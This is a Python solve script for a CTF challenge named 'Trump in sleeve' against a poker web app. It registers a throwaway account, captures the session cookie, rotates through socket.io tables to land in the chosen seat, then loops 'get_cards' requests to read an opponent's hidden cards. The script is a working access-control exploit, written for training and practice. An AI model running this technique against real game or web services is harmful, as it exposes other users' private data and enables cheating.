#!/usr/bin/env python3

import requests
import socketio
import time
from termcolor import colored
from dotenv import load_dotenv
from os import getenv
import re
import random
import string

# Tinkoff CTF chall "Trump in sleeve"
# Registers account and tryes to spy on opponent cards
# Uses websockets (socketio)


PROXIES={
    "https": "https://127.0.0.1:8080"
}

URL = "https://its-cosmo-poker-f7rg4k58.spbctf.ru"

SESSION = ""  # will be obtained on login

USERNAME = ""  # random generated

PASSWORD = "0987poiu!"

ENEMY_POS = 0  # user input

PLAYER_TABLE_ID = 0  # user input

BOT_TABLE_ID = 0

PRIVATE_MODE = True  # room mode

R = requests.Session()
S = socketio.Client(http_session=R)


@S.event
def connect():
    global PRIVATE_MODE
    print('connection established')
    # Auth
    if PRIVATE_MODE:
        mode = "private"
    else:
        mode = "main"
    S.emit(event="authentication", data={"auth": f"session={SESSION}", "mode": mode})


@S.on('*')
def catch_all(event, data):
    print(event, data)


@S.on("join_table")
def on_join_table(data):
    global BOT_TABLE_ID
    table_id = data['table_id']
    print(f"Got table id: {table_id}")
    BOT_TABLE_ID = table_id
    # Requesting table update
    S.emit(event="table_update", data={"auth": f"session={SESSION}", "table_id": table_id})


@S.on("table_update")
def on_table_update(data):
    global USERNAME
    global PRIVATE_MODE
    players = data["table_state"]["players"]
    for player in players:
        if ("username" in player.keys()) and (player["username"] == USERNAME):
            position = player["position_id"]
            print(f"Got position: {position}")
    if position != ENEMY_POS:
        S.disconnect()
        time.sleep(3)
        PRIVATE_MODE = not PRIVATE_MODE
        try_another_table()
    else:
        print(f"Got correct position: {position}")
        get_enemy_cards()


@S.on("get_cards")
def on_get_cards(data):
    print(colored(str(data["cards"]), color="cyan"))
    print()


@S.event
def disconnect():
    print('disconnected from server')


def register_to_server():
    global USERNAME, PASSWORD
    payload = {
        "username": USERNAME,
        "password": PASSWORD
    }
    response = R.post(f"{URL}/register", data=payload, allow_redirects=False)
    print(response)


def login_to_server():
    global USERNAME, PASSWORD
    payload = {
        "username": USERNAME,
        "password": PASSWORD
    }
    response = R.post(f"{URL}/login", data=payload, allow_redirects=False)
    print(response)
    cookie = response.headers["Set-Cookie"]
    pattern = "session=(.+);"
    match = re.search(pattern, cookie)
    session = match.group(1)
    print(session)
    return session


def join_main_room():
    response = R.get(f"{URL}/main_room")
    print(response)


def join_private_room():
    response = R.get(f"{URL}/private_room")
    print(response)


def start_web_sockets():
    global SESSION
    S.connect(f"{URL}/socket.io/", transports=["websocket"])


def try_another_table():
    global PRIVATE_MODE
    green("Joining room")
    if PRIVATE_MODE:
        join_private_room()
    else:
        join_main_room()

    time.sleep(4)

    green("Switching to websocket")
    start_web_sockets()


def get_enemy_cards():
    while True:
        print("=================================================")
        print(colored("Enemy", color="red") + " cards:")
        S.emit(event="get_cards", data={"auth": f"session={SESSION}", "table_id": PLAYER_TABLE_ID, "position_id": ENEMY_POS})
        time.sleep(4)


def green(text):
    print("[ " + colored(text, "light_green", attrs=["bold"]) + " ]")


def main():

    load_dotenv()

    global SESSION
    global ENEMY_POS
    global PLAYER_TABLE_ID
    global USERNAME
    global PASSWORD

    r = ''.join([random.choice(string.ascii_letters + string.digits  ) for n in range(12)])
    USERNAME = r

    PLAYER_TABLE_ID = int(input("Enter your table id: "))
    ENEMY_POS = int(input("Enter your opponents position: "))

    # 1. Register
    green("Registering on server")
    register_to_server()

    # 2. Log in, extract session
    green("Login")
    SESSION = login_to_server()

    # 3. Start table rotation
    try_another_table()


if __name__ == "__main__":
    main()
